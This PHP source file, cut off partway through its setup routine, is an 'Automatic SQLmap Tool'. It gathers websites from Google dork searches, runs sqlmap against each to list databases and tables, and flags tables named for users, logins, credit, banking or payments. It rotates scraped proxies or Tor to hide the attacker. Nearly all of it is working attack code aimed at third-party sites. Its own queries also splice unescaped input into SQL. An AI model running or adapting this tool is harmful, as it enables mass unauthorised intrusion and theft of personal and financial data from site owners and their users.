<?php

/* 

#-----------------------------#
|          COMMANDS           |
#-----------------------------#
 
  Mode:
  
   -a               | Automatic
   -s               | Single

  Options:
  
   --setup          | Setup to initialize scan
   --remove         | Remove current tables according to flags
   --vuln           | Website must be visibly vulnerable
   --tor            | Use a proxychain with TOR
   --overide        | Override checkInDatabase
   --proxy          | Use a proxy
   --optimize       | Use optimization
   --load_scan      | Load list of vulnerable websites from prescan
   --scan_only      | Scan all websites beforehand and shows a list of (selectable) vulnerable websites.
   --dump           | Dump results on the screen
   --help           | Display a list of useful arguments
   timeout=VALUE    | Provide timeout in seconds between the rounds of website gathering
   dork=VALUE       | Set dork
   password=VALUE   | Set password
   flags=VALUE      | Set flags[ASDWC-X]
   color=VAULE      | Use colors or not
   start=VALUE      | Set a start for data gathering
   end=VALUE        | Set an end for data gathering
   scan_hash=VALUE  | Set the value of the prescanned hash
   single_url       | Single url for a single scan
   proxy_circ=VALUE | Set proxy circulation (0-2)
   risk_level=VALUE | Set risk_level (1-3)
   threads=VALUE    | Set maximum threads (1-100)
   count=VALUE      | PagesPerDork (1 = 10 results) OR MAX
   flag=VALUE       | Set the beginning flag for the results (Resuming scan)

*/
    
class SQLmap
{   
    CONST CURLTIMOUT = 10;
    CONST SAVEDIR = '/root/.sqlmap/output/';
    CONST LOGDIR = 'Log/';
    CONST TORPORT = 3128;
    CONST PROXYURL = 'http://aliveproxy.com/proxy-list-port-8080/';
    CONST ERROR_REPORT = true;
    CONST LOG = true;
    CONST URLPING = '8.8.8.8';
        
    // Script Variables
    private $ASPscanned = false;
    private $isAspSite = false;
    private $scanContent = false;
    private $useProxy = false;
    private $setupScan = false;
    private $cleanDork = false;
    private $dumpResults = false;
    private $scanOnly = false;
    private $override = false;
    private $ralot = false;
    private $remove = false;
    private $loadPreScan = false;
    private $scriptCounter = 0;
    private $proxyCircCounter = 0;
    private $proxy_circ = 0;
    private $GGPfail = 0;
    private $ppgCounter = 0;
    private $start = 0;
    private $end = 0;
    private $timeout = 0;
    private $pagesPerDork = 1; // 1 = 10 Google Results
    private $logFile = '';
    private $currentHash = '';
    private $singleUrl = '';
    private $unknownCommand='';
    private $password = '';
    private $flags = '';
    private $currentParameter = '';
    private $optimize = '';
    private $scanHash = '';
    private $noFilter = '';
    private $currentDatabaseName;
    private $currentHostwww;
    private $color;
    private $currentTableName;
    private $current_domain_full;
    private $currentWebsiteIsVisiblyVulnerable;
    private $currentColumnCount;
    private $current_target_plain;
    private $websites = array();
    private $interestingTables = array();
    private $proxyMap= array();
    private $proxyList = array(); // Reading from user input, syntax: [Protocol]://[IP]:[PORT] | ...
    private $availableTables = array();
    private $vulnerableWebsites = array();
    private $availableDatabases = array();
    private $usedProxies = array();

    // Database Variables
    private $currentScanRowId;
    private $currentWebsiteRowId;
    private $currentTableId;
    private $currentDatabaseId;
    private $currentColumnId;
    private $currentWebsiteIsVulnerable;
    
    // SQLMap Variables
    private $mode;
    private $target;
    private $useTor = false;
    private $dork = '';
    private $flag = 0;
    private $threads = 1; // Default=1
    private $risk_level = 1; // Default=1

    /**
     * Function to call with parameters
     * 
     * @param string $args
     */
    public function Process($args)
    {   
        set_time_limit(0);
                
        $this->ErrorReporting();
        $this->EchoStartMessage();
        $this->ImportFiles();
        
        $args = explode('*',$args);

        foreach ($args as $arg)
        {
            $commands = explode('~',$arg); // command[0] = func | command[1] = parameter

            foreach ($commands as $command)
            {
                /////////// MODE //////////////
                if ($arg == "-a"|| $arg='--auto') // automation
                    $this->mode = 'auto';        
                
                if ($arg == "-s" || $arg='--single') // single
                    $this->mode = 'single';    
                
                /////////// PARAMETERS ////////
                if ($command == 'dork')
                    $this->dork = $commands[1];
                
                if($command == '--help')
                    $this->printUsage();
                
                if($command == 'timeout')
                    $this->timeout = $commands[1];
                
                if($command == 'color')
                    $this->color = $commands[1];
                
                if($command == 'single_url')
                    $this->singleUrl = $commands[1];
                
                if ($command == 'count')
                    $this->pagesPerDork = $commands[1];
                
                if($command == 'scan_hash')
                    $this->scanHash = $commands[1];
                
                if($command == 'flag')
                    $this->flag = $commands[1];
                
                 if($command == 'flags')
                    $this->flags = $commands[1];
                 
                 if($command == 'password')
                     $this->password = array_pop((explode('~', $arg)));
                 
                if($command == 'threads')
                    $this->threads = $commands[1];
               
                if($command == 'proxyList')
                    $this->proxyList = explode('\n',$commands[1]);
                
                if($command == 'proxy_circ')
                    $this->proxy_circ = $commands[1];
                
                if($command == 'end')
                    $this->end = $commands[1];
                
                if($command == 'start')
                    $this->start = $commands[1];
                                 
                if($command == '--load_scan')
                    $this->loadPreScan = true;
                
                if($command == '--remove')
                     $this->remove = true;
                
                if($command == '--scan_only')
                    $this->scanOnly = true;
                
                if ($command == '--clean_dork')
                    $this->cleanDork = true;  
                                
                if($command == '--overide')
                    $this->override = true;
                
                if($command == '--optimize' || $command == '-o')
                    $this->optimize  = '-o';
                 
                if($command=='--proxy' || $command=='-p')
                    $this->SetProxyList();
                
                if($command == '--vuln' || $command == '-v')
                    $this->scanContent = true;
               
                if($command == '--dump' || $command == '-d')
                    $this->dumpResults = true; 
                
                if($command == '--setup')
                    $this->setupScan = true; 
                
                if($command == '--no-filter')
                    $this->noFilter = '&filter=0';
            }
        }
        if(!$this->setupScan)
            $this->ValidateParameters();
        if($this->setupScan)
            $this->Setup();
        if($this->scanOnly && !$this->scanContent)
            $this->ThrowError(11);
        if($this->loadPreScan && $this->scanHash == '')
            $this->ThrowError(12);
        if($this->cleanDork)
            $this->ToDatabase(13);
        if($this->remove)
            $this->RemoveAllEntries($this->flags);
        if($this->loadPreScan)
            $this->LoadPreScan($this->scanHash);
        if (!$this->mode && $this->setupScan==false && strlen($this->scanHash) < 1)
            $this->ThrowError(1);
        if ($this->mode == "auto")
            $this->FetchGoogleResults();
        else if($this->mode == "single" && empty($this->singleUrl))
            $this->ThrowError(9);
        else if($this->mode == "single")
            $this->FetchGoogleResults('single');
   }
   
    /**
     * Set the current proxy
     * 
     * @return string
     */
    private function GetCurrentProxy($isGoogleRequest = false)
    { 
        if(!$this->useProxy)
            return;
            
        $callers = debug_backtrace();
        
        if($callers[1]['function'] != 'GetCurrentProxy')
            $this->GGPfail = 0; // Set fail attempts to zero if caller is different
        
        if($this->GGPfail === 5)
            $this->ThrowError(14);
        
        if(!isset($this->proxyMap))
            $this->ThrowError(17);
        
        if((count($this->proxyMap) < (int)$this->proxy_circ * 3) || ($this->proxyMap == array()))
            $this->SetProxyList();
                        
        if($this->proxyMap != array()) // Proxy being used
        {   
            switch($this->proxy_circ)
            {
                case 0: // Default = 0~2
                    
                    $this->proxyCircCounter = ($this->proxyCircCounter+1==3 ? $this->proxyCircCounter = 0 : $this->proxyCircCounter+1);
                    
                    if($this->IsProxyActive($this->proxyMap[0][$this->proxyCircCounter]))
                        if(!$isGoogleRequest)
                            return '--proxy=http://'.$this->proxyMap[0][$this->proxyCircCounter];
                        else
                            return $this->proxyMap[0][$this->proxyCircCounter];
                    else
                    {
                        unset($this->proxyMap[0][$this->proxyCircCounter]);
                        $this->proxyMap[0] = array_values($this->proxyMap[0]);
                        $this->proxyCircCounter = ($this->proxyCircCounter+1==3 ? $this->proxyCircCounter = 0 : $this->proxyCircCounter+1);
                        $this->GGPfail++;
                        $this->GetCurrentProxy();
                        break;
                    }
                    break;
                    
                case 1: // 0~5
                    $this->proxyCircCounter = ($this->proxyCircCounter+1==6 ? $this->proxyCircCounter = 0 : $this->proxyCircCounter+1);
                    
                    if($this->IsProxyActive($this->proxyMap[0][$this->proxyCircCounter]))
                        if(!$isGoogleRequest)
                            return '--proxy=http://'.$this->proxyMap[0][$this->proxyCircCounter];
                        else
                            return $this->proxyMap[0][$this->proxyCircCounter];
                    else
                    {
                        unset($this->proxyMap[0][$this->proxyCircCounter]);
                        $this->proxyMap[0] = array_values($this->proxyMap[0]);
                        $this->proxyCircCounter = ($this->proxyCircCounter+1==6 ? $this->proxyCircCounter = 0 : $this->proxyCircCounter+1);
                        $this->GGPfail++;
                        $this->GetCurrentProxy();
                        break;
                    }
                break;
                
                case 2: // 0~8
                    $this->proxyCircCounter = ($this->proxyCircCounter+1==9 ? $this->proxyCircCounter = 0 : $this->proxyCircCounter+1);
                    
                    if($this->IsProxyActive($this->proxyMap[0][$this->proxyCircCounter]))
                        if(!$isGoogleRequest)
                                return '--proxy=http://'.$this->proxyMap[0][$this->proxyCircCounter];
                        else
                            return $this->proxyMap[0][$this->proxyCircCounter];
                    else    
                    {
                        unset($this->proxyMap[0][$this->proxyCircCounter]);
                        $this->proxyMap[0] = array_values($this->proxyMap[0]);
                        $this->proxyCircCounter = ($this->proxyCircCounter+1==9 ? $this->proxyCircCounter = 0 : $this->proxyCircCounter+1);
                        $this->GGPfail++;
                        $this->GetCurrentProxy();
                        break;
                    }
                break;
            }
        }
    }
    
    /**
     * Validate Parameters
     */
    private function ValidateParameters()
    {
        $this->timeout = (int)$this->timeout;
        $this->threads = (int)$this->threads;
        $this->proxy_circ = (int)$this->proxy_circ;
        
        $parameters = array("dork" => "string",
                            "timeout" => "int",
                            "flags" => "string",
                            "password" => "string",
                            "start" => "int",
                            "end" => "int",
                            "threads" => "int",
                            "proxy_circ" => "int",
                            "flag" => "int"
            );
        
        foreach($parameters as $parameter => $paramtype)
        {
            $fparamtype = 'is_'.$paramtype; $this->currentParameter = $parameter;
            
            if(!$fparamtype($this->$parameter)) // fail
            {
                $this->ThrowError(16);
            }
        }
    }
    
    /**
     * Check if proxy is active
     * 
     * @param type $proxy
     * @return boolean
     */
    private function IsProxyActive($proxy)
    {                
        $proxyArray = explode(':', $proxy);
        
        if($fp = @fsockopen($proxyArray[0], $proxyArray[1], $a, $b, 1)) 
        {
            @fclose($fp);
            $this->Dump("Proxy is up: [$proxy]", false, null, true, true, 1);
            
            $this->usedProxies[] = $proxy;
            return true;
        } 
        else 
        {
            @fclose($fp);
            if(($key = array_search($proxy, $this->proxyMap[0])) !== false)
            {
                unset($this->proxyMap[0][$key]);
                array_values($this->proxyMap[0]);
            }
            $this->Dump("Proxy is down: [$proxy]", false, null, true, false, 2);
            return false;
        }
    }
    
    /**
     * Get file content using cUrl
     * 
     * @param string $url
     * @return string
     */
    private function GetFileContent($url)
    {        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT , self::CURLTIMOUT);
        curl_setopt($ch, CURLOPT_TIMEOUT, self::CURLTIMOUT);
        $content = curl_exec($ch);
        curl_close($ch);
                
        return $content;
    }
    
    /**
     * Set proxy list
     */
    private function SetProxyList()
    {
        $this->useProxy = true;
        preg_match_all( "/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5}/", file_get_contents(self::PROXYURL), $this->proxyMap);
        $this->proxyMap[0] = array_unique($this->proxyMap[0]);
    }
    
    /**
     * Throw error
     * 
     * @param int $errorcode
     */
    private function ThrowError($errorcode)
    {        
        $errors = array(
            0 => "No URL provided.",
            1 => "No mode selected.",
            2 => "Flag set too high.",
            3 => "Flag set too low.",
            4 => "Cannot get id of last inserted table.",
            5 => "Count expected to be [0-99]",
            6 => "Parameters not correct! Type '--help' for a complete list of arguments.",
            7 => "Incorrect/unpresent protection password. [$this->password]",
            8 => "No valid parameters given for removal.",
            9 => "Single mode started but no url provided.",
            10 => "Unkown command: $this->unknownCommand.",
            11 => "--scan_only parameter must be used with --vuln",
            12 => "--loadscan option present without scan_hash",
            13 => "No row found for scan hash [$this->scanHash]",
            14 => "Unable to get current proxy after 3 attemps, aborting scan.",
            15 => "Website array is empty after returning google results.",
            16 => "Parameter [$this->currentParameter] is not valid.",
            17 => "Array is empty, no websites to scan. Scan hash might be invalid."
        );
        
        exit($this->Dump("Errorcode [$errorcode]: " . $errors[$errorcode], false, null, true, false, 3));
    }
    
    /**
     * Prints the Usage
     * 
     * @return string
     */
    private function PrintUsage()
    {
        exit("Usage: php SQLmap.php [args] \n\nModes:\n  -a, --auto                   Scan multiple websites with an automatic scan"
            ."\n  -s, --single                 Scan a single website"
            ."\n  --scan_only                  Scan a dork to save it into the database by hash"
            ."\n  --load_scan                  Load a scan from a scan hash"
            ."\n\nOptions:"
            ."\n  --setup                      Display setup"
            ."\n  -v, --vuln                   Website has too be visible vulnerable to proceed"
            ."\n  -o, --override               Override previous scans and skip certain checks"
            ."\n  -d, --dump                   Dump scan results on screen"
            ."\n  count=COUNT                  Count for google result gathering, use MAX for an unlimited scan"
            ."\n  color=COLOR                  Output colors or not (0-1)"
            ."\n  dork=DORK                    Dork for google result gathering"
            ."\n  timeout=TIMEOUT              set a timeout between google result gathering in seconds"
            ."\n  flag=FLAG                    Set a flag for google result gathering to start on another page"
            ."\n  scan_hash=HASH               Hash reference to load websites from database"
            ."\n  single_url=URL               Url to scan in a single scan"
            ."\n\nSQLmap Parameters:"
            ."\n  -o, --optimize               Turn on optimization parameters"
            ."\n  start=START                  Limit data by providing a starting flag for data-gathering"
            ."\n  end=END                      Limit data by providing an ending flag for data-gathering"
            ."\n  threads=THREADS              Set the amount of threads per second. (1-10)"
            ."\n  risk_level=RISK              Set the risk level beforehand (1-3)"
            ."\n\nProxy:"
            ."\n  -p, --proxy                  Use a proxy"
            ."\n  proxy_circ=VALUE             Proxy circulation in array (0-2)"
            ."\n\nRemoval:"
            ."\n  --remove                     Remove items from database"
            ."\n  flags=VALUE                  Flags: X=all, (S)cans, (W)ebsites, (D)atabases, (T)ables, (C)olumns, A=data"
            ."\n  password=PASS                Password to remove items from database\n\n"
             
                );
    }
    
    /**
     * Loads prescan by hash saved in database
     * 
     * @param type $hash
     */
    private function LoadPreScan($hash)
    {
        $this->ToDatabase(17);
        
        $database = new database();
        $results = $database->query("SELECT vulnerable_websites, scanned FROM Prescanned WHERE hash_identifier='$hash'", true);
        $vulnerableWebsiteArray = array();
        
        while ($row = mysqli_fetch_array($results))
        {
            $scanned = (int)$row['scanned'];
            $vulnerableWebsiteArray = explode('|', $row['vulnerable_websites']);
        }
                
        if($scanned){
            echo "\n".chr(27)."[46m"."[WARNING]".chr(27)."[0m\n";
            echo "\nYou already scanned this hash. Do you want to quit? \n\n1) No\n2) Yes\n\nOption: ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));    
        
            if($value==2)
                return;
        }        
               
        if(empty($vulnerableWebsiteArray))
            $this->ThrowError(17);
        
        $this->Dump($vulnerableWebsiteArray, true, 'Loaded vulnerable websites');
        
        echo 'Which of the following array elements do you want to have scanned? (seperate numbers by comma, use \'all\' to scan all.): ';
        
        $handle = fopen ("php://stdin","r");
        $line = fgets($handle);
        
        if(trim($line) != 'all')
            $answerArray = explode(',', $line);
        else 
            for($e = 0; $e != count($vulnerableWebsiteArray); $e++)
                $answerArray[] = $e;
            
        // rebuild array
        $rebuildArray = array();
        
        foreach($answerArray as $answer)
            $rebuildArray[] = (int)$answer;
                
        foreach($rebuildArray as $key)
            $this->websites[] = $vulnerableWebsiteArray[$key];
        
        $this->ToDatabase(0);
        $this->ExecuteSQLMAP();
        
        exit('scan has ended');
    }
    
    /**
     * Fetch Google results
     */
    private function FetchGoogleResults($mode=null)
    {   
        $data = $this->ToDatabase(16);
        
        while ($row = @mysqli_fetch_array($data))
        {
                $countScanned = @$row['count_scanned'];
                $date = @$row['date'];
        }
        
        if(@$countScanned!=null)
        {
            echo "\n".chr(27)."[46m"."[WARNING]".chr(27)."[0m\n";
            $Readabledate = date('Y-m-d H:i:s', $date);
            $nxc = $countScanned+1;
            echo "\nYou already scanned this dork [$this->dork] on [$Readabledate] count: $countScanned\n\n1) Continue without incrementing count\n2) Presume scan (set count as [$nxc])\n\nOption: ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            
            if($value != '1')
                $this->flag = $nxc;
        }
        
        
        if(strtoupper($this->pagesPerDork) === 'MAX')
        {   
            $this->Dump("'MAX' option detected: Setting pagesPerDork to 1000", false, null, true, true);
            $this->pagesPerDork = 1000;
        }

        $this->ToDatabase(0);

        for ($i = (isset($this->flag) ? $this->flag : 0); $i < $this->pagesPerDork; $i++)
        {   
            if($this->timeout !=0 && $this->ralot==true)
            {
                sleep($this->timeout); 
                $this->Dump("Slept [$this->timeout] seconds", false, 'Sleep Interupt');
            }
            
            $this->ralot = true;
            
            if($mode!=null && $mode=='single') // Select single scan
            {
                $this->websites[] = $this->singleUrl.'=1';
                $this->ValidateUrl();
                $this->ExecuteSQLMAP();
                break;
            }
            
            static $requestCounter = 0;
            
            // Automatic scan (Default);            
            
            $string = 'http://www.google.com/search?hl=enf&safe=active&tbo=d&site=&source=hp&q='.$this->dork."&start=".(string) $i * 10 . $this->noFilter;
            
            $html = file_get_html($string);
            
            if($html === false) // If file_get_contents failed
            {
                $this->Dump('File_get_html returned false', false, null, true, true, 2);
                
                echo 'a';
                while($html===false)
                {
                    echo 'c';
                    $html = file_get_html($string, false, $this->GetCurrentProxy(true));
                }
            }
               
            $linkObjs = $html->find('h3.r a');
                     
            foreach ($linkObjs as $linkObj)
            {
                $link = trim($linkObj->href);

                if (!preg_match('/^https?/',$link) && preg_match('/q=(.+)&amp;sa=/U',$link,$matches) && preg_match('/^https?/',$matches[1]))
                    $link = $matches[1];
                else if (!preg_match('/^https?/',$link))
                    continue;
                
                $this->websites[] = urldecode($link);
            }
            
            if($this->websites == array() || empty($this->websites))
                $this->ThrowError(15);
            
            $this->Dump($this->websites, true, 'Website List BEFORE');
            
            $this->ValidateUrl();
            $this->ExecuteSQLMAP();
                        
            unset($this->websites);
            $this->websites = array();
            $this->ppgCounter++;
            $this->ToDatabase(15);
        }
        
        if($this->scanOnly) // Insert all found websites to database and output scan with #website_list_id
            {
                $this->ToDatabase(14);
                $this->Dump($this->vulnerableWebsites, true, "Prescanned vulnerable websites (".count($this->vulnerableWebsites).")");
                $this->Dump('Prescanned list is saved to database with #->'.$this->currentHash, false, null, true, true);
                exit(); // end --scan_only
            }
    }
    
    /**
     * Echo the start message with version
     */
    private final function EchoStartMessage()
    {
        echo "\n\n####################################################\n##########"." Automatic SQLmap Tool ".chr(27)."[43m"."[v1.1]".chr(27)."[0m"." ############\n####################################################\n\n";
    }
    
    /**
     * Detect table prefix to prevent false positive interestingtable
     * 
     * @param type $table
     * @return boolean
     */
    private function filterTables($table)
    {
        $invalidTables = array("phpbb");
        
        foreach($invalidTables as $inTable)
            if(strpos($table, $inTable)=== false)
            continue;
            else // invalid table
            {
                return false;
                $this->Dump("Table [$table] matches with prefix [$inTable]. Table Discarded.", false, null, true, false, 2);
            }
            
        return  true;
    }
    
    /**
     * Return proxy 
     * 
     * @return type
     */
    private function RetrieveProxyContext()
    {
        $aContext = array(
            'http' => array(
            'proxy' => $this->GetCurrentProxy(true),
            'request_fulluri' => true,
            ),
        );
                
        return stream_context_create($aContext);
    }
    
    /**
     * Executes a specific query
     * 
     * @param string|array $data
     * @param int $code
     */
    private function ToDatabase($code = 0, $return = false, $value=null)
    {
        $database = new database();
        
        switch($code)
        {
            case 0: // Scans
                $query  = "INSERT INTO Scan VALUES(0, '$this->dork', $this->pagesPerDork, ".time().", $this->ppgCounter)"; // Insert Scan
                $link   = $database->query($query,false,false,true);
                $lastID = @mysqli_insert_id($link);

                if ($lastID === false || $lastID === 0)
                    $this->ThrowError(4);

                $this->currentScanRowId = $lastID;
                $this->Dump($query, false, "Query");
                return;

            case 1: // Websites
                $vulnerable = ($this->currentWebsiteIsVulnerable === true ? 1 : 0);
                $vulnerable_v = ($this->currentWebsiteIsVisiblyVulnerable ? 1 : 0);
                $domainInsert = parse_url($this->current_target_plain, PHP_URL_HOST);
                $domainInsert = (strpos($domainInsert, 'www.') ? $domainInsert : trim($domainInsert, 'www.'));
                $query  = "INSERT INTO Website VALUES(0, '$domainInsert', '$this->current_target_plain', $vulnerable ,$vulnerable_v, $this->currentScanRowId)"; // Insert Website
                $link   = $database->query($query,false,false,true);
                $lastID = @mysqli_insert_id($link);
                
                if ($lastID === false || $lastID === 0)
                    $this->ThrowError(4);

                $this->currentWebsiteRowId = $lastID;
                $this->Dump($query, false, "Query");
                return;

            case 2: // Database
                $query  = "INSERT INTO _Database VALUES(0, '$value', $this->currentWebsiteRowId)";
                $link   = $database->query($query,false,false,true);
                $lastID = @mysqli_insert_id($link);

                if ($lastID === false || $lastID === 0)
                    $this->ThrowError(4);

                $this->currentDatabaseId = $lastID;
                $this->Dump($query, false, "Query");
                return;

            case 3: // Table
                $query  = "INSERT INTO _Table VALUES(0, '$value', $this->currentDatabaseId, 0)";
                $link   = $database->query($query,false,false,true);
                $lastID = @mysqli_insert_id($link);
           
                if ($lastID === false || $lastID === 0)
                    $this->ThrowError(4);

                $this->currentTableId = $lastID;
                $this->Dump($query, false, "Query");
                return;       
                
            case 4: // Column
                $query  = "INSERT INTO _Column VALUES(0, '$value', $this->currentTableId)"; // Insert Website
                $link   = $database->query($query,false,false,true);
                $lastID = @mysqli_insert_id($link);
           
                if ($lastID === false || $lastID === 0)
                    $this->ThrowError(4);

                $this->currentColumnId = $lastID;
                $this->Dump($query, false, "Query");
                return; 
                
            case 5: // Data
                $query  = "INSERT INTO Data VALUES(0, '$value', $this->currentColumnId, $this->currentColumnCount)"; // Insert Website
                $link   = $database->query($query,false,false,true);
                $this->Dump($query, false, "Query");
                return;    

                
           // Removal
            case 6: // Remove Databases
                $query = "DELETE FROM _Database";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
                
            case 7: // Remove Tables
                $query = "DELETE FROM _Table";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
                
            case 8: // Remove Websites
                $query = "DELETE FROM Website";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
                
            case 9: // Remove Tables
                $query = "DELETE FROM _Column";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
             
            case 10: // Remove Data
                $query = "DELETE FROM Data";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
                
            case 11: // Remove Scans
                $query = "DELETE FROM Scan";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
                
            case 12: // Remove All
                $query = "DELETE FROM _Database";
                $database->query($query);
                $query = "DELETE FROM _Table";
                $database->query($query);
                $query = "DELETE FROM Website";
                $database->query($query);
                $query = "DELETE FROM _Column";
                $database->query($query);
                $query = "DELETE FROM Data";
                $database->query($query);
                $query = "DELETE FROM _Scan";
                $database->query($query);
                $this->Dump($query, false, "Removed All tables");
                return;
            case 13:
                $query = "DELETE FROM Website WHERE scan_id IN (SELECT id FROM Scan WHERE dork='$this->dork');";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
            case 14:
                $this->currentHash = $this->GenerateHash();
                $query = "INSERT INTO Prescanned VALUES(0, '{$this->currentHash}', '".implode('|',$this->vulnerableWebsites)."', $this->currentScanRowId, 0);";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
            case 15:
                $query = "UPDATE Scan SET count_scanned=$this->ppgCounter WHERE id=$this->currentScanRowId";
                $database->query($query);
                $this->Dump($query, false, "Query");
                return;
                
            case 16:
                $query = "SELECT count_scanned, date FROM Scan WHERE dork='$this->dork' ORDER BY count_scanned DESC LIMIT 1";
                $data = $database->query($query, true);
                $this->Dump($query, false, "Query");
                return $data;
            case 17:
                $query = "UPDATE Prescanned SET scanned=1 WHERE hash_identifier = '$this->scanHash'";
                $data = $database->query($query, true);
                $this->Dump($query, false, "Query");
                return $data;
            case 18:
                $query = "UPDATE Table SET interesting=1 WHERE id = $this->currentTableId";
                $data = $database->query($query, true);
                $this->Dump($query, false, "Query");
                return $data;
        }          
    }
    
    /**
     * Executes SQLmap.py 
     */
    private function ExecuteSQLMAP()
    {
        $this->Dump($this->websites,true,"Websites [parsed]");
        $scriptCounter = 0;
        
        foreach ($this->websites as $website)
        {
            $this->SetCurrentDomain($website);
            $this->current_target_plain = $website;
            
            if(!$this->loadPreScan)
            {
                if(!$this->override)
                    if ($this->CheckInDatabase($website))
                        continue;
            }
            
            if($this->scanContent)
            {
                if ($this->ContentScan($website) === false)
                {
                    continue;
                }
            }
            else
            {
                $this->ToDatabase(1);
            }
            
            $this->Dump('Target Url is VULNERABLE: '.$website,false,"Vulnerable Domain", true, true, 1);
            
            if($this->scanOnly)
            {
                $this->vulnerableWebsites[] = $website;
                $this->Dump("Target Url [$website] will not be scanned but inserted in array.",false,"Prescan notification");
                continue;
            }            
            
            $SQLmapResults = array();
            $tor = ($this->useTor ?  '--tor --tor-port='.self::TORPORT : '');
            $risklevel = ($this->risk_level>0 ? "--risk=$this->risk_level" : "");
                        
            if(!$this->isAspSite)
                $sqlMapCommand = "python SQLmap/sqlmap.py -u '$website' --dbs $tor --threads=$this->threads $risklevel --risk=$this->risk_level {$this->GetCurrentProxy()} --batch $this->optimize";
            else
                $sqlMapCommand = "python SQLmap/sqlmap.py -u '$website' --tables $tor --threads=$this->threads $risklevel {$this->GetCurrentProxy()} --batch $this->optimize";

            $this->Dump($sqlMapCommand,false,"SQLmap Started [Databases]");
            
            
            exec($sqlMapCommand, $SQLmapResults);
            
            $this->Dump($SQLmapResults, true, "SQLMAP Database Results");
            $this->AnalyseVulnerable($this->target);
            $scriptCounter++;
        }
    }
    
    /**
     * Checks if table is interesting.
     * 
     * @param type $table
     * @return boolean
     */
    private function IsInterestingTable($table)
    {
        if($table==array())
        {
            $this->Dump('Table is equivalent to array. Aborting..', false, null, true, false, 2);
            return false;
        }
        
        $interestingTableArray = array(
                        'Users' => array('person', 
                                         'usr',
                                         'user',
                                         'staff',
                                         'customer',
                                         'acc',
                                         'memb',
                                         'adm',
                                         'login',
                                        ),
                        'Money'=>   array('credit',
                                          'bill',
                                          'bank',
                                          'order',
                                          'pay',
                                          'salary',
                                        )
        );
        
        foreach($interestingTableArray as $interestingTableArray)
        {
            foreach($interestingTableArray as $interestingTable)
            {
                if(strpos($table, $interestingTable) === FALSE || in_array($interestingTable, $this->interestingTables)) // If table if not intersting.
                {
                    continue;
                }
                else // Table is interesting
                {
                    $this->interestingTables[] = $interestingTable;
                    $this->Dump('Table is interesting! Found match with: '.$interestingTable.' = '.$table.'. Resuming scan.', false, null, true, true, 1);
                    return true;
                }
            }
        }
        
        $this->Dump("No interesting match found with [$table].", false, null, true, false, 2);
        return false;
    }
    
    /**
     * Get tables within each database
     */
    private function ExecuteSQLMAPTables($database)
    {
        if(!empty($database))
            $this->currentDatabaseName = $database;
        
        $website = $this->current_target_plain;
        $this->Dump($website,false,"Fetching Tables");
        
        $risklevel = ($this->risk_level>0 ? "--risk=$this->risk_level" : '');
        $tor = ($this->useTor ?  '--tor --tor-port='.self::TORPORT : '');
        
        if (!$this->isAspSite)
            $sqlMapCommand = "python SQLmap/sqlmap.py -u '$website' -D $database --tables $tor --threads=$this->threads $risklevel {$this->GetCurrentProxy()} --batch $this->optimize";                
        else
            $sqlMapCommand = "python SQLmap/sqlmap.py -u '$website' --tables $tor --threads=$this->threads $risklevel {$this->GetCurrentProxy()} --batch $this->optimize";                
        
        $sqlmapTableResults = array();
        $this->Dump($sqlMapCommand,false,"SQLmap started [Tables]");
        exec($sqlMapCommand, $sqlmapTableResults);
        $this->Dump($sqlmapTableResults, true, "SQLMAP Table RESULTS");        
        $this->AnalyseTables();
    }
    
    /**
     * Setup scan
     */
    private function Setup()
    {
        $this->dumpResults = true;
        `tput setaf 1;`;
        echo "Select an option:\n\n1) Automatic scan \n2) Single scan \n3) Load scan \n4) Scan only \n5) Remove database items\n\nOption: ";
        
        $handle = fopen ("php://stdin","r");
        $line = trim(fgets($handle));
        
        if($line == '1') // Automatic scan
        {
            echo "\nDork (string): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->dork = $value;
            
            echo "\nCount (integer/max): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->pagesPerDork = $value;
            
            echo "\nThreads (integer 1-10): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->threads = $value;
            
            echo "\nStart Sqlmap data-retrieval (integer): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->start = $value;
            
            echo "\nEnd Sqlmap data-retrieval (integer): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->end = $value;
            
            echo "\nRisk level (integer 1-3): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->risk_level = $value;
            
            echo "\nTimeout (integer): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->timeout = $value;
            
            echo "\nMust be vulnerable (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->scanContent = true;
            
            echo "\nOverride results (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->override = true;
            
            echo "\nDump results (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->dumpResults = true;
            
            echo "\nUse proxy (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y'){ $this->useProxy = true;
                echo "\nProxy circulator: 0-2: ";
                $handle = fopen ("php://stdin","r");
                $value = trim(fgets($handle));
                if(!empty($value))
                    $this->proxy_circ = $value;
            }
            
            echo "\nDisplay color (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'n') $this->color = 0;
            
            
            $this->mode = 'auto';
            $this->FetchGoogleResults();
        }
        
